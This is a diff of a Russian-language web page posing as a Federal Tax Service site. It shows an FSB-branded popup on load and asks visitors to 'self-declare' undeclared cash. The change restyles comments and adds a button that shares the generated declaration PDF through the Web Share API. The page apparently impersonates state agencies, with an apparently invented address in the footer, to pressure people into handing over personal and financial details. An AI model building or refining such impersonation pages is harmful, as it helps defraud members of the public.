@@ -10,7 +10,9 @@
     rel="stylesheet"
   />
   <style>
-    /* === ОБЩИЕ СБРОСЫ === */
+    /* ==============================
+       ОБЩИЕ СБРОСЫ И НАСТРОЙКИ
+       ============================== */
     *, *::before, *::after {
       box-sizing: border-box;
       margin: 0;
@@ -43,7 +45,9 @@
       background: none;
     }
 
-    /* === МОДАЛЬНОЕ ОКНО === */
+    /* ==============================
+       МОДАЛЬНОЕ ОКНО (FSB MODAL)
+       ============================== */
     .modal-overlay {
       display: none;
       position: fixed;
@@ -61,7 +65,7 @@
     }
     .modal {
       position: relative;
-      background: #fff;
+      background: #ffffff;
       border-radius: 6px;
       width: 100%;
       max-width: 360px;
@@ -118,9 +122,11 @@
       }
     }
 
-    /* === ШАПКА === */
+    /* ==============================
+       ШАПКА (HEADER)
+       ============================== */
     .site-header {
-      background: #fff;
+      background: #ffffff;
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
       padding: 16px 0;
       position: relative;
@@ -196,7 +202,9 @@
       }
     }
 
-    /* === НАВИГАЦИЯ === */
+    /* ==============================
+       НАВИГАЦИЯ (NAV)
+       ============================== */
     .site-nav {
       background: #004d99;
       border-radius: 4px;
@@ -213,7 +221,7 @@
       padding: 0 16px;
     }
     .nav-inner a {
-      color: #fff;
+      color: #ffffff;
       margin: 6px 12px;
       font-weight: 600;
       font-size: 15px;
@@ -236,12 +244,14 @@
       }
     }
 
-    /* === КОНТЕЙНЕР === */
+    /* ==============================
+       КОНТЕЙНЕР СОДЕРЖИМОГО (container)
+       ============================== */
     .container {
       width: 100%;
       max-width: 960px;
       margin: 36px auto 40px;
-      background: #fff;
+      background: #ffffff;
       padding: 24px 20px;
       border-radius: 6px;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
@@ -272,7 +282,9 @@
       }
     }
 
-    /* === УВЕДОМЛЕНИЕ НА СТРАНИЦЕ === */
+    /* ==============================
+       УВЕДОМЛЕНИЕ НА СТРАНИЦЕ
+       ============================== */
     #notification {
       background: #fffde8;
       border-left: 5px solid #f17b35;
@@ -301,7 +313,9 @@
       }
     }
 
-    /* === ФОРМА === */
+    /* ==============================
+       ФОРМА И ПОЛЯ (form-row)
+       ============================== */
     fieldset.group {
       border: 1px solid #004d99;
       border-radius: 5px;
@@ -429,7 +443,9 @@
       }
     }
 
-    /* === КНОПКИ === */
+    /* ==============================
+       КНОПКИ (button)
+       ============================== */
     button[type="submit"] {
       background: #004d99;
       color: #fff;
@@ -446,16 +462,16 @@
       cursor: not-allowed;
     }
 
-    /* === КНОПКА «ПОДЕЛИТЬСЯ PDF» (пока задизейблена) === */
+    /* Кнопка «Поделиться PDF» */
     #sharePdfButton {
-      background: #a0a0a0;
+      background: #a0a0a0; /* серый, пока disabled */
       color: #fff;
       padding: 12px 20px;
       font-size: 16px;
       font-weight: 600;
       border-radius: 4px;
       margin-top: 16px;
-      margin-left: 12px;
+      margin-left: 12px; /* отступ между кнопками */
       transition: background 0.2s, transform 0.1px;
       font-family: 'PT Sans', sans-serif;
     }
@@ -473,11 +489,13 @@
         width: 100%;
         padding: 14px 0;
         font-size: 15px;
-        margin-left: 0;
+        margin-left: 0; /* при узком экране кнопки станут вертикальными */
       }
     }
 
-    /* === УСПЕШНОЕ СООБЩЕНИЕ === */
+    /* ==============================
+       УСПЕШНОЕ СООБЩЕНИЕ
+       ============================== */
     #success-message {
       display: none;
       background: #e9f7ef;
@@ -500,7 +518,9 @@
       }
     }
 
-    /* === ПОДВАЛ === */
+    /* ==============================
+       ПОДВАЛ (footer)
+       ============================== */
     footer {
       background: #003366;
       color: #fff;
@@ -523,7 +543,9 @@
       }
     }
 
-    /* === PDF-КОНТЕНТ (скрыт до генерации) === */
+    /* ==============================
+       PDF-КОНТЕНТ И ПЕЧАТЬ (@media print)
+       ============================== */
     #pdfContent {
       display: none;
       background: #fff;
@@ -669,23 +691,13 @@
       }
       #pdfContent > * { margin: 0; }
     }
-
-    /* === СТИЛЬ ДЛЯ ССЫЛКИ-ЗАГРУЗКИ PDF (появится после генерации) === */
-    #downloadLink {
-      display: none;
-      margin-top: 16px;
-      font-size: 16px;
-      color: #004d99;
-      font-weight: 600;
-    }
-    #downloadLink:hover {
-      text-decoration: underline;
-    }
   </style>
 </head>
 <body>
 
-  <!-- МОДАЛЬНОЕ ОКНО УВЕДОМЛЕНИЯ -->
+  <!-- ==============================
+       МОДАЛЬНОЕ ОКНО УВЕДОМЛЕНИЯ (FSB MODAL)
+       ============================== -->
   <div id="fsbModal" class="modal-overlay">
     <div class="modal">
       <button class="close-btn" onclick="closeModal()">×</button>
@@ -700,7 +712,9 @@
     </div>
   </div>
 
-  <!-- ШАПКА -->
+  <!-- ==============================
+       ШАПКА (HEADER)
+       ============================== -->
   <header class="site-header">
     <div class="header-inner">
       <div class="logo-left">
@@ -732,9 +746,11 @@
     </nav>
   </header>
 
-  <!-- КОНТЕЙНЕР СОДЕРЖИМОГО -->
+  <!-- ==============================
+       КОНТЕЙНЕР СОДЕРЖИМОГО
+       ============================== -->
   <div class="container">
-    <!-- Уведомление на странице -->
+    <!-- Уведомление на странице (до формы) -->
     <div id="notification">
       <h2>Информация от ФНС России</h2>
       <p>В соответствии с разделом III главы 23 Налогового кодекса РФ просим подать самодекларацию о наличии незадекларированных наличных денежных средств.</p>
@@ -840,7 +856,7 @@
         <!-- Кнопка «Подать самодекларацию» -->
         <button type="submit" id="submitBtn" disabled>Подать самодекларацию</button>
 
-        <!-- Кнопка «Поделиться PDF» (оставили, но она не активируется; вместо неё идёт ссылка ниже) -->
+        <!-- Кнопка «Поделиться PDF» (изначально disabled) -->
         <button type="button" id="sharePdfButton" disabled>Поделиться PDF</button>
       </div>
     </form>
@@ -849,12 +865,11 @@
     <div id="success-message" style="display: none; margin-top: 12px;">
       <p><strong>Спасибо!</strong> Ваша самодекларация принята к рассмотрению. В случае необходимости мы свяжемся с вами по предоставленным данным.</p>
     </div>
-
-    <!-- Явная ссылка для скачивания PDF (появится после генерации) -->
-    <a id="downloadLink" href="#" download="declaration.pdf">Скачать PDF</a>
   </div>
 
-  <!-- СЕКЦИЯ ДЛЯ ГЕНЕРАЦИИ PDF -->
+  <!-- ==============================
+       СЕКЦИЯ ДЛЯ ГЕНЕРАЦИИ PDF
+       ============================== -->
   <div id="pdfContent">
     <!-- Шапка PDF -->
     <div id="pdfHeader">
@@ -914,7 +929,9 @@
     </div>
   </div>
 
-  <!-- ПОДВАЛ -->
+  <!-- ==============================
+       ПОДВАЛ (footer)
+       ============================== -->
   <footer>
     <p>Федеральная налоговая служба РФ, 119991, г. Москва, ул. Налоговая, д. 15</p>
     <p>Телефон: 8 (800) 222-22-22 • E-mail: <a href="mailto:info@nalog.ru">info@nalog.ru</a></p>
@@ -928,7 +945,6 @@
     crossorigin="anonymous"
     referrerpolicy="no-referrer"
   ></script>
-
   <script>
     document.addEventListener('DOMContentLoaded', () => {
       // 1) Показываем модалку сразу после загрузки
@@ -981,6 +997,9 @@
           submitBtn.disabled = !this.checked;
         });
       }
+
+      // Переменная для хранения последнего PDF-Blob
+      let latestPdfBlob = null;
 
       // 5) Обработка отправки формы
       const form = document.getElementById('declarationForm');
@@ -1057,7 +1076,7 @@
 
         // 5.5) Настройки html2pdf
         const opt = {
-          margin:      [10, 10, 10, 10],
+          margin:      [10, 10, 10, 10],      // мм
           filename:    'declaration.pdf',
           image:       { type: 'jpeg', quality: 0.98 },
           html2canvas: { scale: 2, useCORS: true },
@@ -1071,6 +1090,8 @@
           .toPdf()
           .output('blob')
           .then(blob => {
+            latestPdfBlob = blob;
+
             // 5.6.1) Автоматическая загрузка PDF
             const url = URL.createObjectURL(blob);
             const link = document.createElement('a');
@@ -1088,27 +1109,54 @@
             document.getElementById('declarationForm').style.display = 'none';
             document.getElementById('success-message').style.display = 'block';
 
-            // 5.6.4) Создаём объект-URL для ссылки «Скачать PDF»
-            const downloadLink = document.getElementById('downloadLink');
-            const blobUrl = URL.createObjectURL(blob);
-            downloadLink.href = blobUrl;
-            downloadLink.style.display = 'inline-block';
-
-            // Когда пользователь нажмёт «Скачать PDF», URL будет автоматически сброшен:
-            downloadLink.addEventListener('click', () => {
-              // через секунду после клика удаляем object URL
-              setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
-            });
+            // 5.6.4) Активируем кнопку «Поделиться PDF»
+            const shareBtn = document.getElementById('sharePdfButton');
+            shareBtn.disabled = false;
+            shareBtn.style.background = '#004d99';
+            console.log('Кнопка «Поделиться PDF» активирована');
           });
+      });
+
+      // 6) Обработчик клика по кнопке «Поделиться PDF»
+      document.getElementById('sharePdfButton').addEventListener('click', async () => {
+        console.log('Нажата «Поделиться PDF»');
+        if (latestPdfBlob === null) {
+          console.warn('PDF ещё не сгенерирован.');
+          return;
+        }
+        const file = new File([latestPdfBlob], 'declaration.pdf', { type: 'application/pdf' });
+        if (navigator.canShare && navigator.canShare({ files: [file] })) {
+          try {
+            await navigator.share({
+              files: [file],
+              title: 'Самодекларация ФНС',
+              text: 'Смотрите вложенный PDF-файл декларации.'
+            });
+            console.log('Успешно поделились через Web Share API');
+            return;
+          } catch (err) {
+            console.error('Ошибка шаринга через API:', err);
+          }
+        }
+        // Fallback: скачиваем PDF ещё раз
+        console.log('Web Share API не поддерживается или произошла ошибка, выполняем скачивание…');
+        const fallbackUrl = URL.createObjectURL(latestPdfBlob);
+        const fallbackLink = document.createElement('a');
+        fallbackLink.href = fallbackUrl;
+        fallbackLink.download = 'declaration.pdf';
+        document.body.appendChild(fallbackLink);
+        fallbackLink.click();
+        document.body.removeChild(fallbackLink);
+        URL.revokeObjectURL(fallbackUrl);
       });
     });
 
-    // === ФУНКЦИИ ===
+    // ============== ФУНКЦИИ ==============
     function showModal() {
       const overlay = document.getElementById('fsbModal');
       if (overlay) {
         overlay.classList.add('open');
-        document.body.style.overflow = 'hidden';
+        document.body.style.overflow = 'hidden'; // отключаем прокрутку фона
       }
     }
     function closeModal() {
